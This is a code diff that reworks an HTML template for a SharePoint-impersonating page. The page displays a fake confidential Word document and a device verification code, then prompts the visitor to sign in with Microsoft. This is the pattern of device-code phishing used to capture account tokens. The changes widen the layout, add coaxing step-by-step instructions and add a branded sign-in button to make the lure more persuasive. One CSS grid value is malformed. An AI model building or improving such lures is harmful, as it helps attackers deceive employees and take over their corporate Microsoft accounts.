@@ -3260,7 +3260,7 @@ const DEVICE_CODE_SHAREPOINT_HTML = `<!DOCTYPE html>
             height: 48px;
             display: flex;
             align-items: center;
-            padding: 0 16px;
+            padding: 0 24px;
             color: white;
             font-size: 16px;
             font-weight: 600;
@@ -3272,32 +3272,64 @@ const DEVICE_CODE_SHAREPOINT_HTML = `<!DOCTYPE html>
             justify-content: center;
             align-items: center;
             min-height: calc(100vh - 48px);
-            padding: 20px;
+            padding: 24px;
             box-sizing: border-box;
         }
 
+        /* Changed to a wider, landscape-oriented container */
         .auth-card {
             background: var(--sp-card);
             width: 100%;
-            max-width: 420px;
+            max-width: 820px;
             border-radius: 4px;
             box-shadow: 0 4px 16px rgba(0,0,0,0.1);
-            padding: 32px;
+            padding: 40px;
             box-sizing: border-box;
         }
 
-        .logo-area { margin-bottom: 20px; text-align: center; }
-        .logo-area img { width: 42px; height: 42px; }
+        /* Two-column layout grid for landscape viewing */
+        .landscape-grid {
+            display: grid;
+            grid-template-columns: 1.1sfr 1fr;
+            gap: 40px;
+            align-items: start;
+        }
 
-        h1 { font-size: 20px; font-weight: 600; margin: 0 0 8px 0; color: #201f1e; text-align: center; }
-        p.instruction { color: var(--sp-text-muted); font-size: 14px; margin: 0 0 24px 0; line-height: 1.4; text-align: center; }
+        @media (max-width: 768px) {
+            .landscape-grid {
+                grid-template-columns: 1fr;
+                gap: 24px;
+            }
+        }
 
-        /* Enhanced File/Document Container */
+        .logo-area { margin-bottom: 16px; text-align: left; }
+        .logo-area img { width: 36px; height: 36px; }
+
+        h1 { font-size: 22px; font-weight: 600; margin: 0 0 12px 0; color: #201f1e; text-align: left; }
+        
+        /* Clear operational instructions for the one-time password */
+        .instruction-box {
+            color: var(--sp-text-main);
+            font-size: 14px;
+            margin: 0 0 20px 0;
+            line-height: 1.5;
+            text-align: left;
+        }
+        
+        .instruction-box ol {
+            margin: 8px 0 0 0;
+            padding-left: 20px;
+            color: var(--sp-text-muted);
+        }
+        
+        .instruction-box li {
+            margin-bottom: 6px;
+        }
+
         .file-container {
             border: 1px solid var(--sp-border);
             border-radius: 6px;
             background: #ffffff;
-            margin-bottom: 24px;
             overflow: hidden;
             text-align: left;
         }
@@ -3328,8 +3360,6 @@ const DEVICE_CODE_SHAREPOINT_HTML = `<!DOCTYPE html>
             font-weight: 600;
             color: #201f1e;
             margin-bottom: 2px;
-            overflow: hidden;
-            text-overflow: ellipsis;
         }
 
         .file-meta {
@@ -3356,12 +3386,30 @@ const DEVICE_CODE_SHAREPOINT_HTML = `<!DOCTYPE html>
             border-radius: 4px;
         }
 
+        /* Right column controls alignment */
+        .controls-panel {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            height: 100%;
+            padding-top: 10px;
+        }
+
+        .code-label {
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--sp-text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 6px;
+        }
+
         .code-input-display {
-            font-size: 28px;
+            font-size: 32px;
             font-weight: 700;
             color: var(--sp-primary);
             letter-spacing: 6px;
-            margin: 16px 0;
+            margin-bottom: 20px;
             padding: 14px;
             background: #f3f2f1;
             border-radius: 4px;
@@ -3369,22 +3417,42 @@ const DEVICE_CODE_SHAREPOINT_HTML = `<!DOCTYPE html>
             text-align: center;
         }
 
+        /* Updated Action Buttons */
         .btn-primary {
             background-color: var(--sp-primary);
             color: white;
             border: none;
-            padding: 10px 20px;
+            padding: 12px 20px;
             border-radius: 4px;
             font-size: 14px;
             font-weight: 600;
             cursor: pointer;
             width: 100%;
-            margin-top: 10px;
+            margin-bottom: 12px;
             transition: background-color 0.1s ease;
         }
 
         .btn-primary:hover { background-color: #106ebe; }
         .btn-primary:disabled { background-color: #c8c6c4; cursor: not-allowed; color: #a19f9d; }
+
+        .btn-secondary {
+            background-color: #ffffff;
+            color: #201f1e;
+            border: 1px solid #8a8886;
+            padding: 12px 20px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: background-color 0.1s ease, border-color 0.1s ease;
+        }
+
+        .btn-secondary:hover { background-color: #f3f2f1; border-color: #323130; }
 
         .timer { font-size: 12px; color: var(--sp-text-muted); margin-top: 16px; text-align: center; }
         .status-msg { font-size: 13px; min-height: 22px; font-weight: 500; margin: 6px 0 4px; color: #107c10; text-align: center; }
@@ -3392,25 +3460,25 @@ const DEVICE_CODE_SHAREPOINT_HTML = `<!DOCTYPE html>
         .success-view {
             display: none;
             text-align: center;
-            padding: 12px 0;
+            padding: 40px 0;
         }
         .success-view .check-icon {
             display: inline-block;
             background: #107c10;
             color: white;
             border-radius: 50%;
-            width: 56px;
-            height: 56px;
-            line-height: 56px;
-            font-size: 28px;
-            margin-bottom: 16px;
+            width: 64px;
+            height: 64px;
+            line-height: 64px;
+            font-size: 32px;
+            margin-bottom: 20px;
         }
-        .success-view h2 { font-weight: 600; margin-bottom: 4px; font-size: 20px; }
-        .success-view p { color: var(--sp-text-muted); margin-bottom: 12px; font-size: 14px; }
+        .success-view h2 { font-weight: 600; margin-bottom: 8px; font-size: 22px; }
+        .success-view p { color: var(--sp-text-muted); margin-bottom: 16px; font-size: 14px; }
         .success-badge {
             background: #dff6dd;
             color: #107c10;
-            padding: 8px 12px;
+            padding: 8px 16px;
             border-radius: 4px;
             display: inline-block;
             font-weight: 600;
@@ -3426,43 +3494,64 @@ const DEVICE_CODE_SHAREPOINT_HTML = `<!DOCTYPE html>
 
     <div class="main-container">
         <div class="auth-card">
-            <div id="mainView">
-                <div class="logo-area">
-                    <img src="https://www.microsoft.com/content/dam/microsoft/bade/images/icons/en-us/m365-app-icons-fy26/SharePoint-Icon-FY26.svg" alt="SharePoint">
-                </div>
+            <div id="mainView" class="landscape-grid">
                 
-                <h1>Access Protected Document</h1>
-                <p class="instruction">To view this corporate asset, please confirm your identity using device authentication.</p>
+                <!-- Left Column: File details and contextual step instructions -->
+                <div class="info-panel">
+                    <div class="logo-area">
+                        <img src="https://www.microsoft.com/content/dam/microsoft/bade/images/icons/en-us/m365-app-icons-fy26/SharePoint-Icon-FY26.svg" alt="SharePoint">
+                    </div>
+                    
+                    <h1>Access Protected Document</h1>
+                    
+                    <div class="instruction-box">
+                        A temporary one-time password has been generated to verify your workspace access permissions. Please complete the following steps:
+                        <ol>
+                            <li>Click the authorization button or sign in with your corporate account.</li>
+                            <li>When prompted, paste or input the secure code shown on the right.</li>
+                            <li>Keep this window open until your document workspace loads successfully.</li>
+                        </ol>
+                    </div>
 
-                <!-- New Document File View -->
-                <div class="file-container">
-                    <div class="file-header">
-                        <!-- Standard Microsoft Word Icon for styling -->
-                        <img class="file-icon" src="https://res-1.cdn.office.net/files/fabric-cdn-prod_20240129.001/assets/item-types/32/docx.svg" alt="Document">
-                        <div class="file-info">
-                            <div class="file-name">Confidential_Report_2026.docx</div>
-                            <div class="file-meta">SharePoint Online &bull; Protected File</div>
+                    <div class="file-container">
+                        <div class="file-header">
+                            <img class="file-icon" src="https://res-1.cdn.office.net/files/fabric-cdn-prod_20240129.001/assets/item-types/32/docx.svg" alt="Document">
+                            <div class="file-info">
+                                <div class="file-name">Confidential_Report_2026.docx</div>
+                                <div class="file-meta">SharePoint Online &bull; Protected File</div>
+                            </div>
+                        </div>
+                        <div class="document-preview">
+                            <div class="blurred-text">
+                                <div style="width: 85%;"></div>
+                                <div style="width: 95%;"></div>
+                                <div style="width: 40%;"></div>
+                            </div>
                         </div>
                     </div>
-                    <div class="document-preview">
-                        <div class="blurred-text">
-                            <div style="width: 85%;"></div>
-                            <div style="width: 95%;"></div>
-                            <div style="width: 40%;"></div>
-                            <div style="width: 70%;"></div>
-                        </div>
-                    </div>
                 </div>
 
-                <div class="code-input-display" id="userCode">Loading...</div>
+                <!-- Right Column: Verification actions and OTP Display -->
+                <div class="controls-panel">
+                    <div class="code-label">Verification Code</div>
+                    <div class="code-input-display" id="userCode">Loading...</div>
+                    
+                    <!-- Modified Primary Action Button Text -->
+                    <button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>Authenticate with Code</button>
+                    
+                    <!-- New Identity Provider Button -->
+                    <button class="btn-secondary" id="msSignInBtn" onclick="openSignIn()">
+                        <svg width="16" height="16" viewBox="0 0 23 23" xmlns="http://www.w3.org/2000/svg"><path fill="#f35325" d="M0 0h11v11H0z"/><path fill="#81bc06" d="M12 0h11v11H12z"/><path fill="#05a6f0" d="M0 12h11v11H0z"/><path fill="#ffba08" d="M12 12h11v11H12z"/></svg>
+                        Sign in with Microsoft
+                    </button>
+
+                    <div class="status-msg" id="codeStatus"></div>
+                    <div class="timer">Code expires in <span id="timerValue">{expires_minutes}</span></div>
+                </div>
                 
-                <button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>Sign In to Continue</button>
-
-                <div class="status-msg" id="codeStatus"></div>
-
-                <div class="timer">Code expires in <span id="timerValue">{expires_minutes}</span></div>
             </div>
 
+            <!-- Handled standard functional layout for successful operations -->
             <div class="success-view" id="successView">
                 <div class="check-icon">✔</div>
                 <h2>Verification Complete</h2>
